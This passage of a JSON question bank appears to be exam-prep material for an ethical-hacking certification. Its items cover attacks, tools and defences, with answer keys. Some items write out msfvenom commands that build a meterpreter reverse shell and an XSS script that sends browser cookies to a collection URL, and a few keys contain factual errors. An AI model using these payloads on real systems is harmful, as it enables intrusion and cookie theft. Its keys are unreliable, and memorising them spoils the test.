      "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.12 LPORT=8888 -f c",
      "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.12 LPORT=8888 -f exe > shell.exe",
      "msfvenom -p windows/meterpreter/reverse_tcp RHOST=10.10.10.12 LPORT=8888 -f exe > shell.exe",
      "msfvenom -p windows/meterpreter/reverse_tcp RHOST=10.10.10.12 LPORT=8888 -f c"
    ],
    "correct": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.12 LPORT=8888 -f exe > shell.exe"
  },
  {
    "id": 178,
    "question": "All the industrial control systems of your organization are connected to the Internet. Your management wants to empower the manufacturing process, ensure the reliability of industrial networks, and reduce downtime and service disruption. You have been assigned to find and install an OT security tool that further protects against security incidents such as cyber espionage, zero-day attacks, and malware. Which of the following tools will you use to accomplish this task?",
    "answers": [
      "BalenaCloud",
      "IntentFuzzer",
      "Flowmon",
      "Robotium"
    ],
    "correct": "Flowmon"
  },
  {
    "id": 179,
    "question": "Your organization has a public key infrastructure set up. Your colleague Bernard wants to send a message to Joan. Therefore, Bernard both encrypts the message and digitally signs it. Bernard uses ____ to encrypt the message for these purposes, and Joan uses ____ to confirm the digital signature.",
    "answers": [
      "Bernard's public key; Bernard's public key.",
      "Joan's private key; Bernard's public key.",
      "Joan's public key; Bernard's public key.",
      "Joan's public key; Joan's public key."
    ],
    "correct": "Joan's public key; Bernard's public key."
  },
  {
    "id": 180,
    "question": "You enter the following command to get the necessary data: ping -* 6 192.168.120.114\n\nOutput:\n\nPinging 192.168.120.114 with 32 bytes of data:\n\nReply from 192.168.120.114: bytes=32 time<1ms TTL=128\nReply from 192.168.120.114: bytes=32 time<1ms TTL=128\nReply from 192.168.120.114: bytes=32 time<1ms TTL=128\nReply from 192.168.120.114: bytes=32 time<1ms TTL=128\nReply from 192.168.120.114: bytes=32 time<1ms TTL=128\nReply from 192.168.120.114: bytes=32 time<1ms TTL=128\n\nPing statistics for 192.168.120.114\nPackets: Sent = 6, Received = 6, Lost = 0 (0% loss).\n\nApproximate round trip times in milli-seconds:\nMinimum = 0ms, Maximum = 0ms, Average = 0ms\n\nWhich of the following flags is hidden under \"*\"?",
    "answers": [
      "a",
      "s",
      "n",
      "t"
    ],
    "correct": "n"
  },
  {
    "id": 181,
    "question": "Your organization is implementing a vulnerability management program to evaluate and control the risks and vulnerabilities in IT infrastructure. At the moment, your security department is in the vulnerability management lifecycle phase in which is executing the process of applying fixes on vulnerable systems to reduce the impact and severity of vulnerabilities. Which of the following vulnerability-management phases is your security department in?",
    "answers": [
      "Remediation",
      "Risk assessment",
      "Verification",
      "Vulnerability scan"
    ],
    "correct": "Remediation"
  },
  {
    "id": 182,
    "question": "To bypass firewalls using the DNS tunnelling method to exfiltrate data, you can use the NSTX tool. On which of the following ports should be run the NSTX tool?",
    "answers": [
      "50",
      "53",
      "80",
      "23"
    ],
    "correct": "53"
  },
  {
    "id": 183,
    "question": "Viktor, a professional hacker, targeted an organization\u2019s network to sniff all the traffic. During this process, Viktor plugged in a rogue switch to an unused port in the LAN with a priority lower than any other switch in the network so that he could make it a root bridge that will later allow him to sniff all the traffic in the network. What is the attack performed by Viktor in the above scenario?",
    "answers": [
      "VLAN hopping attack",
      "DNS poisoning attack",
      "STP attack",
      "ARP spoofing attack"
    ],
    "correct": "STP attack"
  },
  {
    "id": 184,
    "question": "You simulate an attack on your organization's network resources and target the NetBIOS service. You decided to use the NetBIOS API for this attack and perform an enumeration. After finishing, you found that port 139 was open, and you could see the resources that could be accessed or viewed on a remote system. Also, you came across many NetBIOS codes during enumeration. Which of the following NetBIOS codes is used for obtaining the messenger service running for the logged-in user?",
    "answers": [
      "<03>",
      "<1B>",
      "<00>",
      "<20>"
    ],
    "correct": "<03>"
  },
  {
    "id": 185,
    "question": "Identify the exploit framework whose capabilities include automated attacks on services, ports, applications and unpatched security flaws?",
    "answers": [
      "Nessus",
      "Wireshark",
      "Metasploit",
      "Maltego"
    ],
    "correct": "Metasploit"
  },
  {
    "id": 186,
    "question": "Which of the following is a piece of hardware on a motherboard that generates encryption keys and only releases a part of the key so that decrypting a disk on a new piece of hardware is impossible?",
    "answers": [
      "GPU",
      "UEFI",
      "CPU",
      "TPM"
    ],
    "correct": "TPM"
  },
  {
    "id": 187,
    "question": "You want to make your life easier and automate the process of updating applications. You decide to use a user-defined HTTP callback or push APIs that are raised based on trigger events. When this feature invokes, data is supplied to other applications so that users can instantly receive real-time information. What is the name of this technique?",
    "answers": [
      "Web shells",
      "Webhooks",
      "SOAP API",
      "REST API"
    ],
    "correct": "Webhooks"
  },
  {
    "id": 188,
    "question": "You must bypass the firewall. To do this, you plan to use DNS to perform data exfiltration on an attacked network. You embed malicious data into the DNS protocol packets. DNSSEC can't detect these malicious data, and you successfully inject malware to bypass a firewall and maintain communication with the victim machine and C&C server. Which of the following techniques would you use in this scenario?",
    "answers": [
      "DNS cache snooping",
      "DNSSEC zone walking",
      "DNS tunneling",
      "DNS enumeration"
    ],
    "correct": "DNS tunneling"
  },
  {
    "id": 189,
    "question": "Identify the protocol used to secure an LDAP service against anonymous queries?",
    "answers": [
      "WPA",
      "NTLM",
      "RADIUS",
      "SSO"
    ],
    "correct": "NTLM"
  },
  {
    "id": 190,
    "question": "During the scan, you found a serious vulnerability, compiled a report and sent it to your colleagues. In response, you received proof that they fixed this vulnerability a few days ago. How can you characterize this vulnerability?",
    "answers": [
      "True-false",
      "False-positive",
      "False-true",
      "False-negative"
    ],
    "correct": "False-positive"
  },
  {
    "id": 191,
    "question": "You need to transfer sensitive data of the organization between industrial systems securely. For these purposes, you have decided to use short-range wireless communication technology that meets the following requirements: - Protocol based on the IEEE 203.15.4 standard; - Range of 10-100 m. - Designed for small-scale projects which need wireless connection. Which of the following protocols will meet your requirements?",
    "answers": [
      "MQTT",
      "NB-IoT",
      "Zigbee",
      "LPWAN"
    ],
    "correct": "Zigbee"
  },
  {
    "id": 192,
    "question": "You need to identify the OS of the target host. You want to use the Unicornscan tool to do this. As a result of using the tool, you got the TTL value and determined that the target system is running a Windows OS. Which of the following TTL values did you get when using the program?",
    "answers": [
      "128",
      "64",
      "138",
      "255"
    ],
    "correct": "128"
  },
  {
    "id": 193,
    "question": "You must choose a tool for monitoring your organization's website, analyzing the website's traffic, and tracking the geographical location of the users visiting the organization's website. Which of the following tools will you use for these purposes?",
    "answers": [
      "WebSite-Watcher",
      "Webroot",
      "Web-Stat",
      "WAFW00F"
    ],
    "correct": "Web-Stat"
  },
  {
    "id": 194,
    "question": "You are the head of the Network Administrators department. And one of your subordinates uses SNMP to manage networked devices from a remote location. And one of your subordinates uses SNMP to manage networked devices from a remote location. To manage network nodes, your subordinate uses MIB, which contains formal descriptions of all network objects managed by SNMP. He accesses the contents of MIB by using a web browser either by entering the IP address and Lseries.mib or by entering the DNS library name and Lseries.mib. You know that your subordinate can retrieve information from a MIB that contains object types for workstations and server services. Which of the following types of MIB will your subordinate use to retrieve information about types for workstations and server services?",
    "answers": [
      "MIB_II.MIB",
      "DHCP.MIB",
      "LNMIB2.MIB",
      "WINS.MIB"
    ],
    "correct": "LNMIB2.MIB"
  },
  {
    "id": 195,
    "question": "Your boss informed you that a problem was detected in the service running on port 389 and said that you must fix this problem as soon as possible. What service is running on this port, and how can you fix this problem?",
    "answers": [
      "The service is NTP, and you have to change it from UDP to TCP to encrypt it.",
      "The service is LDAP. You must change it to 636, which is LDAPS.",
      "The findings do not require immediate actions and are only suggestions.",
      "The service is SMTP, and you must change it to SMIME, which is an encrypted"
    ],
    "correct": "The service is LDAP. You must change it to 636, which is LDAPS."
  },
  {
    "id": 196,
    "question": "Ivan, the evil hacker, decided to use Nmap scan open ports and running services on systems connected to the target organization's OT network. For his purposes, he enters the Nmap command into the terminal which identifies Ethernet/IP devices connected to the Internet and further gathered information such as the vendor name, product code and name, device name, and IP address. Which of the following commands did Ivan use in this scenario?",
    "answers": [
      "nmap -Pn -sT --scan-delay 1s --max-parallelism 1 -p < Port List > < Target IP >",
      "nmap -Pn -sT -p 46824 < Target IP >",
      "nmap -Pn -sU -p 44818 --script enip-info < Target IP >",
      "nmap -Pn -sT -p 102 --script s7-info < Target IP >"
    ],
    "correct": "nmap -Pn -sU -p 44818 --script enip-info < Target IP >"
  },
  {
    "id": 197,
    "question": "Identify the technique by description: During the execution of this technique, an attacker copies the entire website and its content on a local drive to view the complete profile of the site's directory structure, file structure, web pages, images, etc. Thanks to the information gathered using this technique, an attacker map the website's directories and gains valuable information.",
    "answers": [
      "Website defacement",
      "Session hijacking",
      "Web cache poisoning",
      "Website mirroring"
    ],
    "correct": "Website mirroring"
  },
  {
    "id": 198,
    "question": "Which of the following online tools allows attackers to gather information related to the model of the IoT device and the certifications granted to it?",
    "answers": [
      "EarthExplorer",
      "search.com",
      "Google image search",
      "FCC ID search"
    ],
    "correct": "FCC ID search"
  },
  {
    "id": 199,
    "question": "Which of the following rootkit types sits undetected in the core components of the operating system?",
    "answers": [
      "Hypervisor rootkit",
      "Firmware rootkit",
      "Kernel rootkit",
      "Hardware rootkit"
    ],
    "correct": "Kernel rootkit"
  },
  {
    "id": 200,
    "question": "You have detected an abnormally large amount of traffic coming from local computers at night. You decide to find out the reason, do a few checks and find that an attacker has exfiltrated user data. Also, you noticed that AV tools could not find any malicious software, and the IDS/IPS has not reported on any non-whitelisted programs. Which of the following type of malware did the attacker use to bypass your company\u2019s application whitelisting?",
    "answers": [
      "Fileless malware",
      "Phishing malware",
      "Zero-day malware",
      "Logic bomb malware"
    ],
    "correct": "Fileless malware"
  },
  {
    "id": 201,
    "question": "You performed a tool-based vulnerability assessment and found vulnerabilities. You have started to analyze these issues and found that they are not true vulnerabilities. How can you characterize these issues?",
    "answers": [
      "False negatives",
      "True positives",
      "False positives",
      "True negatives"
    ],
    "correct": "False positives"
  },
  {
    "id": 202,
    "question": "A post-breach forensic investigation revealed that a known vulnerability in Apache Struts was to blame for the Equifax data breach that affected 147 million people In September of 2017. At the same time fix was available from the software vendor for several months before the intrusion. In which of the following security processes has failed?",
    "answers": [
      "Security awareness training",
      "Vendor risk management",
      "Patch management",
      "Secure development lifecycle"
    ],
    "correct": "Patch management"
  },
  {
    "id": 203,
    "question": "Which of the following algorithms uses a 64-bit block size that is encrypted three times with 56-bit keys?",
    "answers": [
      "Triple DES",
      "DES",
      "AES",
      "IDEA"
    ],
    "correct": "Triple DES"
  },
  {
    "id": 204,
    "question": "Which of the following attacks can you perform if you know that the web server handles the \"(../)\" (character string) incorrectly and returns the file listing of a folder structure of the server?",
    "answers": [
      "Directory traversal.",
      "Cross-site scripting.",
      "SQL injection.",
      "Denial of service."
    ],
    "correct": "Directory traversal."
  },
  {
    "id": 205,
    "question": "Identify the attack by description: This attack is performed at layer 7 to take down web infrastructure. During its execution, partial HTTP requests are sent to the web infrastructure or applications and upon receiving a partial request, the target server opens multiple connections and keeps waiting for the requests to complete.",
    "answers": [
      "Slowloris attack",
      "Phlashing",
      "Session splicing",
      "Desynchronization"
    ],
    "correct": "Slowloris attack"
  },
  {
    "id": 206,
    "question": "The attacker wants to attack the target organization's Internet-facing web server. In case of a successful attack, he will also get access to back-end servers protected by a firewall. The attacker plans to use URL https://mainurl.com/feed.php?url=externalsite.com/feed/to to obtain a remote feed and alter the URL to the localhost to view all the local resources on the target server. Which of the following types of attacks is the attacker planning to perform?",
    "answers": [
      "Website defacement.",
      "Web server misconfiguration.",
      "Server-side request forgery attack.",
      "Web cache poisoning attack."
    ],
    "correct": "Server-side request forgery attack."
  },
  {
    "id": 207,
    "question": "Which of the following Metasploit Framework tool can be used to bypass antivirus?",
    "answers": [
      "msfcli",
      "msfencode",
      "msfpayload",
      "msfd"
    ],
    "correct": "msfencode"
  },
  {
    "id": 208,
    "question": "You have successfully executed the attack and launched the shell on the target network. Now you want to identify all the OS of machines running on this network. You are trying to run the Nmap command to perform this task and see the following:  hackeduser@hackedserver.~$ nmap -T4 -O 192.168.0.0/24  TCP/IP fingerprinting (for OS scan) xxxxxxx xxxxxx xxxxxxxxx.  QUITTING!  Why couldn't the scan be performed?",
    "answers": [
      "The shell is not stabilized.",
      "OS Scan requires root privileges.",
      "The outgoing TCP/IP fingerprinting is blocked by the host firewall.",
      "The nmap syntax is wrong."
    ],
    "correct": "OS Scan requires root privileges."
  },
  {
    "id": 209,
    "question": "Johnny decided to gather information for identity theft from the target organization. He wants to redirect the organization\u2019s web traffic to a malicious website. After some thought, he plans to perform DNS cache poisoning by exploiting the vulnerabilities in the DNS server software and wants to modify the original IP address of the target website to that of a malicious website. Which of the following techniques does Johnny plan to use?",
    "answers": [
      "Skimming",
      "Wardriving",
      "Pharming",
      "Pretexting"
    ],
    "correct": "Pharming"
  },
  {
    "id": 210,
    "question": "Which of the following is the firewall evasion scanning technique that uses a zombie system with low network activity?",
    "answers": [
      "Idle scanning",
      "Decoy scanning",
      "Packet fragmentation scanning",
      "Spoof source address scanning"
    ],
    "correct": "Idle scanning"
  },
  {
    "id": 211,
    "question": "You know that an attacker can create websites similar to legitimate sites in pharming and phishing attacks. Which of the following is the difference between them?",
    "answers": [
      "Phishing attack: an attacker provides the victim with a URL that is either misspelled or looks similar to the legitimate website's domain name.",
      "Pharming attack: a victim is redirected to a fake website by modifying their host configuration file or exploiting DNS vulnerabilities.",
      "Pharming attack: an attacker provides the victim with a URL that is either misspelled or looks similar to the legitimate website's domain name.",
      "Phishing attack: a victim is redirected to a fake website by modifying their host configuration file or exploiting DNS vulnerabilities.",
      "Both pharming and phishing attacks are identical.",
      "Both pharming and phishing attacks are purely technical."
    ],
    "correct": "Pharming attack: a victim is redirected to a fake website by modifying their host configuration file or exploiting DNS vulnerabilities."
  },
  {
    "id": 212,
    "question": "Identify the footprinting technique by description: Using this technique, an attacker can gather domain information such as the target domain name, contact details of its owner, expiry date, and creation date. Also, using this information, an attacker can create a map of the organization\u2019s network and misleads domain owners with social engineering to obtain internal details of its network.",
    "answers": [
      "VPN footprinting",
      "Whois footprinting",
      "VoIP footprinting",
      "Email footprinting"
    ],
    "correct": "Whois footprinting"
  },
  {
    "id": 213,
    "question": "Your friend installed the application from a third-party app store. After a while, some of the applications in his smartphone were replaced by malicious applications that appeared legitimate, and he began to receive a lot of advertising spam. Which of the following attacks has your friend been subjected to?",
    "answers": [
      "Agent Smith attack",
      "SIM card attack",
      "Clickjacking",
      "SMS phishing attack"
    ],
    "correct": "Agent Smith attack"
  },
  {
    "id": 214,
    "question": "You found that sensitive data, employee usernames, and passwords are shared in plaintext, paving the way for hackers to perform successful session hijacking. Which of the following protocols, which can send data using encryption and digital certificates, will help solve this problem?",
    "answers": [
      "FTPS",
      "HTTPS",
      "IP",
      "FTP"
    ],
    "correct": "FTPS"
  },
  {
    "id": 215,
    "question": "When configuring wireless on the router, your colleague disables SSID broadcast but leaves authentication \"open\" and sets SSID to a 32-character string of random letters and numbers. Which of the following is the correct statement about this scenario?",
    "answers": [
      "The router is still vulnerable to wireless hacking attempts because the SSID broadcast setting can be enabled using a specially crafted packet sent to the access point's hardware address.",
      "The hacker still has the opportunity to connect to the network after sniffing the SSID from a successful wireless association.",
      "This move will prevent brute-force attacks.",
      "Disabling SSID broadcast prevents 802.11 beacons from being transmitted from the access point, resulting in a proper setup leveraging \"security through obscurity\"."
    ],
    "correct": "The hacker still has the opportunity to connect to the network after sniffing the SSID from a successful wireless association."
  },
  {
    "id": 216,
    "question": "Your company has hired Jack, a cybersecurity specialist, to conduct another pentest. Jack immediately decided to get to work. He launched an attack on the DHCP servers by broadcasting forged DHCP requests and leased all the DHCP addresses available in the DHCP scope until the server could not issue any more IP addresses. As a result of these actions, a DDoS attack occurred, and legitimate employees could not access the company's network. Which of the following attacks did Jack perform?",
    "answers": [
      "STP attack",
      "DHCP starvation",
      "VLAN hopping",
      "Rogue DHCP server attack"
    ],
    "correct": "DHCP starvation"
  },
  {
    "id": 217,
    "question": "Your organization conducts a vulnerability assessment for mitigating threats. Your task is to scan the organization by building an inventory of the protocols found on the organization\u2019s machines to detect which ports are attached to services such as a web server, an email server or a database server. After this, you will need to select the vulnerabilities on each machine and start executing only the relevant tests. Which of the following type of vulnerability assessment solutions will you perform?",
    "answers": [
      "Service-based solutions",
      "Product-based solutions",
      "Inference-based assessment",
      "Tree-based assessment"
    ],
    "correct": "Inference-based assessment"
  },
  {
    "id": 218,
    "question": "Identify the phase of the APT lifecycle that the hacker is in at the moment according to the scenario given below: The hacker prepared for an attack and attempted to enter the target network using techniques such as sending spear-phishing emails and exploiting vulnerabilities on publicly available servers. Thanks to the successful attack, he deployed malware on the target system to establish an outbound connection and began to move on.",
    "answers": [
      "Persistence",
      "Initial intrusion",
      "Cleanup",
      "Preparation"
    ],
    "correct": "Initial intrusion"
  },
  {
    "id": 219,
    "question": "Identify the attack used in the scenario below: The victim connected his iPhone to a public computer that the attacker had previously infected. After establishing the connection with this computer, the victim enabled iTunes Wi-Fi sync so that the device could continue communication with that computer even after being physically disconnected. Now the attacker who infected the computer can access the victim's iPhone and monitor all of the victim's activity on the iPhone, even after the device is out of the communication zone.",
    "answers": [
      "Exploiting SS7 vulnerability",
      "iOS trustjacking",
      "Man-in-the-disk attack",
      "iOS jailbreaking"
    ],
    "correct": "iOS trustjacking"
  },
  {
    "id": 220,
    "question": "John wants to attack the target organization, but before that, he needs to gather information. For these purposes, he performs DNS footprinting to gather information about DNS servers and identify the hosts connected to the target network. John is going to use an automated tool that can retrieve information about DNS zone data, including DNS domain names, computer names, IP addresses, DNS records, and network Whois records. Which of the following tools will John use?",
    "answers": [
      "zANTI",
      "Bluto",
      "Towelroot",
      "Knative"
    ],
    "correct": "Bluto"
  },
  {
    "id": 221,
    "question": "Jonh, a security specialist, conducts a pentest in his organization. He found information about the emails of two employees in some public sources and is preparing a client- side backdoor to send to the employees via email. Which of the stages of the cyber kill chain does John perform?",
    "answers": [
      "Reconnaissance",
      "Command and control",
      "Weaponization",
      "Exploitation"
    ],
    "correct": "Weaponization"
  },
  {
    "id": 222,
    "question": "You want to execute an SQLi attack. The first thing you check is testing the response time of a true or false response. Secondly, you want to use another command to determine whether the database will return true or false results for user IDs. Which two SQL injection types have you tried to perform?",
    "answers": [
      "Time-based and union-based",
      "Out of band and boolean-based",
      "Union-based and error-based",
      "Time-based and boolean-based"
    ],
    "correct": "Time-based and boolean-based"
  },
  {
    "id": 223,
    "question": "You must discover all the active devices hidden by a restrictive firewall in the IPv4 range in a target network. Which of the following host discovery techniques will you use?",
    "answers": [
      "ACK flag probe scan",
      "ARP ping scan",
      "UDP scan",
      "TCP Maimon scan"
    ],
    "correct": "ARP ping scan"
  },
  {
    "id": 224,
    "question": "Ivan, the evil hacker, decided to attack the cloud services of the target organization. First of all, he decided to infiltrate the target's MSP provider by sending phishing emails that distributed specially created malware. This program compromised users' credentials, and Ivan managed to gain remote access to the cloud service. Further, he accessed the target customer profiles with his MSP account, compressed the customer data, and stored them in the MSP. After this, he used this information to launch further attacks on the target organization. Which of the following cloud attacks did Ivan perform?",
    "answers": [
      "Cloud hopper attack",
      "Cloud cryptojacking",
      "Man-in-the-cloud (MITC) attack",
      "Cloudborne attack"
    ],
    "correct": "Cloud hopper attack"
  },
  {
    "id": 225,
    "question": "Which of the following programs is best used for analyzing packets on your wireless network?",
    "answers": [
      "Ethereal with Winpcap",
      "Wireshark with Winpcap",
      "Wireshark with Airpcap",
      "Airsnort with Airpcap"
    ],
    "correct": "Wireshark with Airpcap"
  },
  {
    "id": 226,
    "question": "Which of the following types of attack (that can use either HTTP GET or HTTP POST) allows an attacker to induce users to perform actions that they do not intend to perform?",
    "answers": [
      "Cross-Site Request Forgery",
      "SQL Injection",
      "Browser Hacking",
      "Cross-Site Scripting"
    ],
    "correct": "Cross-Site Request Forgery"
  },
  {
    "id": 227,
    "question": "Which of the following is a type of virus detection method where the anti-virus executes the malicious codes on a virtual machine to simulate CPU and memory activities?",
    "answers": [
      "Heuristic Analysis",
      "Code Emulation",
      "Scanning",
      "Integrity checking"
    ],
    "correct": "Code Emulation"
  },
  {
    "id": 228,
    "question": "You have been assigned the task of checking the implementation of security policies in the company. During the audit, you found that a user from the IT department had a dial- out modem installed. Which of the following security policies should you check to see if dial-out modems are allowed?",
    "answers": [
      "Remote-access policy",
      "Firewall policy",
      "Acceptable-use policy",
      "Permissive policy"
    ],
    "correct": "Remote-access policy"
  },
  {
    "id": 229,
    "question": "You have discovered that someone is posting strange images without comments on your forum. You decide to check it out and discover the following code is hidden behind those images: \n&lt;script&gt; \ndocument&period;write&lpar;&bsol;&quot;&lt;img&period;src&equals;&bsol;&quot;https&colon;&sol;&sol;localhost&sol;submitcookie&period;php&quest; cookie &equals;&bsol;&quot; &plus; escape&lpar;document&period;cookie&rpar; &plus;&bsol;&quot;&bsol;&quot; &sol;&gt;&rpar;&semi;\n&lt;&sol;script&gt;\nWhat does this script do?",
    "answers": [
      "The code is a virus that is attempting to gather the user's username and password.",
      "The code redirects the user to another site.",
      "This PHP file silently executes the code and grabs the user's session cookie and session ID.",
      "The code injects a new cookie into the browser."
    ],
    "correct": "This PHP file silently executes the code and grabs the user's session cookie and session ID."
  },
  {
    "id": 230,
    "question": "Justin, the evil hacker, wants to steal Joanna's data. He sends Joanna an email with a malicious link that looks legitimate. Joanna unknowingly clicks on the link, and it redirects her to a malicious web page, and John steals Joanna's data. Which of the following attacks is described in this scenario?",
    "answers": [
      "Vishing",
      "Phishing",
      "DDoS",
      "Spoofing"
    ],
    "correct": "Phishing"
  },
  {
    "id": 231,
    "question": "John sent a TCP ACK segment to a known closed port on a firewall, but it didn't respond with an RST. What conclusion can John draw about the firewall he scanned?",
    "answers": [
      "There is no firewall.",
      "John can't draw any conclusions based on this information.",
      "It's a stateful firewall.",
      "It's a non-stateful firewall."
    ],
    "correct": "It's a stateful firewall."
  },
  {
    "id": 232,
    "question": "Your company has decided to purchase a subscription to a cloud-hosted solution. After purchasing this solution, the only administrative task of your employees will be the management of user accounts. The provider will cover all hardware, operating system, and software administration (including patching and monitoring). Which of the following is this type of solution?",
    "answers": [
      "Saas",
      "Iaas",
      "Caas",
      "PaaS"
    ],
    "correct": "Saas"
  },
  {
    "id": 233,
    "question": "Which of the following is a vulnerability in which the malicious person forces the user's browser to send an authenticated request to a server?",
    "answers": [
      "Cross-site scripting",
      "Session hijacking",
      "Cross-site request forgery",
      "Server-side request forgery"
    ],
    "correct": "Cross-site request forgery"
  },
  {
    "id": 234,
    "question": "Which of the following commands verify a user ID on an SMTP server?",
    "answers": [
      "EXPN",
      "VRFY",
      "RCPT",
      "NOOP"
    ],
    "correct": "VRFY"
  },
  {
    "id": 235,
    "question": "As usual, you want to open your online banking from your home computer. You enter the URL www.yourbanksite.com into your browser. The website is displayed and prompts you to re-enter your credentials as if you have never visited the site before. You decide to check the URL of the website and notice that the site is not secure and the web address appears different. Which of the following types of attacks have you been exposed to?",
    "answers": [
      "ARP cache poisoning",
      "DoS attack",
      "DHCP spoofing",
      "DNS hijacking"
    ],
    "correct": "DNS hijacking"
  },
  {
    "id": 236,
    "question": "According to the configuration of the DHCP server, only the last 100 IP addresses are available for lease in subnet 10.1.4.0/23. Which of the following IP addresses is in the range of the last 100 addresses?",
    "answers": [
      "10.1.4.254",
      "10.1.5.200",
      "10.1.3.156",
      "10.1.155.200"
    ],
    "correct": "10.1.5.200"
  },
  {
    "id": 237,
    "question": "Which of the following Nmap commands perform a stealth scan?",
    "answers": [
      "nmap -sM",
      "nmap -sT",
      "nmap -sS",
      "nmap -sU"
    ],
    "correct": "nmap -sS"
  },
  {
    "id": 238,
    "question": "The attacker created a fake account on a dating site and wrote to John with an offer to get acquainted. Fake profile photos enthralled John, and he initiated a conversation with the attacker's fake account. After a few hours of communication, the attacker began asking about his company and eventually gathered all the essential information about the target company. What is the social engineering technique the attacker used in this scenario?",
    "answers": [
      "Honey trap",
      "Baiting",
      "Diversion theft",
      "Piggybacking"
    ],
    "correct": "Honey trap"
  },
  {
    "id": 239,
    "question": "What is the common name of vulnerability disclosure programs opened by companies on HackerOne, Bugcrowd, etc.?",
    "answers": [
      "Ethical hacking program",
      "White-hat hacking program",
      "Bug bounty program",
      "Vulnerability hunting program"
    ],
    "correct": "Bug bounty program"
  },
  {
    "id": 240,
    "question": "Identify the correct syntax for ICMP scan on a remote computer using hping2.",
    "answers": [
      "hping2 --l target.domain.com",
      "hping2 -1 target.domain.com",
      "hping2 target.domain.com",
      "hping2 --set-ICMP target.domain.com"
    ],
    "correct": "hping2 -1 target.domain.com"
  },
  {
    "id": 241,
    "question": "Ron, the hacker, is trying to crack an employee's password of the target organization utilizing a rainbow table. During the break-in, he discovered that upon entering a password that extra characters are added to the password after submitting. Which of the following countermeasures is the target company using to protect against rainbow tables?",
    "answers": [
      "Password hashing",
      "Account lockout",
      "Password salting",
      "Password key hashing"
    ],
    "correct": "Password salting"
  },
  {
    "id": 242,
    "question": "Which of the following ports must you block first in case that you are suspicious that an IoT device has been compromised?",
    "answers": [
      "22",
      "48101",
      "8080",
      "80"
    ],
    "correct": "48101"
  },
  {
    "id": 243,
    "question": "What of the following is a file which is the rich target to discover the structure of a website during web-server footprinting?",
    "answers": [
      "Robots.txt",
      "domain.txt",
      "Document root",
      "index.html"
    ],
    "correct": "Robots.txt"
  },
  {
    "id": 244,
    "question": "The attacker performs an attack during which, using a MITM attack technique, he sends his session ID using. Firstly the attacker obtains a valid session ID by logging into a service and later feeds the same session ID to the victim. The session ID links the victim to the attacker's account page without disclosing any information to the victim. Then the attacker waits until the victim clicks on the link, and after this, the sensitive payment details entered in a form are linked to the attacker's account. Which of the following attacks was the attacker performing?",
    "answers": [
      "Session fixation",
      "Forbidden",
      "Session donation",
      "CRIME"
    ],
    "correct": "Session donation"
  },
  {
    "id": 245,
    "question": "Which of the following is an IOS jailbreaking technique that patches the kernel during the device boot to keep jailbroken after each reboot?",
    "answers": [
      "Tethered jailbreaking",
      "Untethered jailbreaking",
      "Semi-tethered jailbreaking",
      "Semi-untethered jailbreaking"
    ],
    "correct": "Untethered jailbreaking"
  },
  {
    "id": 246,
    "question": "The attacker plans to compromise the systems of organizations by sending malicious emails. He decides to use the tool to track the target's emails and collect information such as senders' identities, mail servers, sender IP addresses, and sender locations from different public sources. It also checks email addresses for leaks using haveibeenpwned.com API. Which of the following tools is used by the attacker?",
    "answers": [
      "Netcraft",
      "ZoomInfo",
      "Factiva",
      "Infoga"
    ],
    "correct": "Infoga"
  },
  {
    "id": 247,
    "question": "While browsing his social media feed, Jacob noticed Jane's photo with the caption: \"Learn more about your friends,\" as well as several personal questions under the post. Jacob is suspicious and texts Jane with questions about this post. Jane confirms that she did indeed post it. With the assurance that the post is legitimate, Jacob responds to the questions on the friend's post. A few days later, Jacob tries to log into his bank account and finds out that it has been compromised and the password was changed. What most likely happened?",
    "answers": [
      "Jacob's password was stolen while he was enthusiastically participating in the survey.",
      "Jacob's bank-account login information was brute-forced.",
      "Jacob's computer was infected with a Banker Trojan.",
      "Jacob inadvertently provided the answers to his security questions when responding to Jane's post."
    ],
    "correct": "Jacob inadvertently provided the answers to his security questions when responding to Jane's post."
  },
  {
    "id": 248,
    "question": "Identify the attack by description: The attacker decides to attack IoT devices. First, he will record the frequency required to share information between connected devices. Once he gets the necessary frequency, the attacker will capture the original data when the connected devices initiate commands. As soon as he collects original data, he will use tools such as URH to segregate the command sequence. The final step in this attack will be starting injecting the segregated command sequence on the same frequency into the IoT network, which repeats the captured signals of the devices.",
    "answers": [
      "Side-channel attack.",
      "Cryptanalysis attack.",
      "Reconnaissance attack.",
      "Replay attack."
    ],
    "correct": "Replay attack."
  },
  {
    "id": 249,
    "question": "While checking your organization's wireless network, you found that the wireless network component is not sufficiently secure. It uses an old encryption protocol designed to mimic wired encryption. Which of the following protocols is used in your organization's wireless network? ",
    "answers": [
      "RADIUS",
      "WPA",
      "WEP",
      "WPA3"
    ],
    "correct": "WEP"
  },
  {
    "id": 250,
    "question": "Which of the following files determines the basic configuration in an Android application, such as broadcast receivers, services, etc.?",
    "answers": [
      "resources.asrc",
      "AndroidManifest.xml",
      "APK.info",
      "classes.dex"
    ],
    "correct": "AndroidManifest.xml"
  },
  {
    "id": 251,
    "question": "Ivan, a black hacker, wants to attack the target company. He thought about the fact that vulnerable IoT devices could be used in the company. To check this, he decides to use the tool, scan the target network for specific types of IoT devices and detect whether they are using the default, factory-set credentials. Which of the following tools will Ivan use?",
    "answers": [
      "Azure IoT Central",
      "Cloud IoT Core",
      "Bullguard IoT",
      "IoTSeeker"
    ],
    "correct": "IoTSeeker"
  },
  {
    "id": 252,
    "question": "Ivan, an evil hacker, spreads Emotet malware through the malicious script in the organization he attacked. After infecting the device, he used Emote to spread the infection across local networks and beyond to compromise as many machines as possible. He reached this thanks to a tool which is a self-extracting RAR file (containing bypass and service components) to retrieve information related to network resources such as writable share drives. What tool did Ivan use?",
    "answers": [
      "Mail PassView",
      "Outlook scraper",
      "NetPass.exe",
      "Credential enumerator"
    ],
    "correct": "Credential enumerator"
  },
  {
    "id": 253,
    "question": "Which of the following standards is most applicable for a major credit card company?",
    "answers": [
      "HIPAA",
      "Sarbanes-Oxley Act",
      "PCI-DSS",
      "FISMA"
    ],
    "correct": "PCI-DSS"
  },
  {
    "id": 254,
    "question": "Identify technique for securing the cloud resources according to describe below: This technique assumes by default that a user attempting to access the network is not an authentic entity and verifies every incoming connection before allowing access to the network. When using this technique imposed conditions such that employees can access only the resources required for their role.",
    "answers": [
      "DMZ",
      "Container technology",
      "Serverless computing",
      "Zero trust network"
    ],
    "correct": "Zero trust network"
  },
  {
    "id": 255,
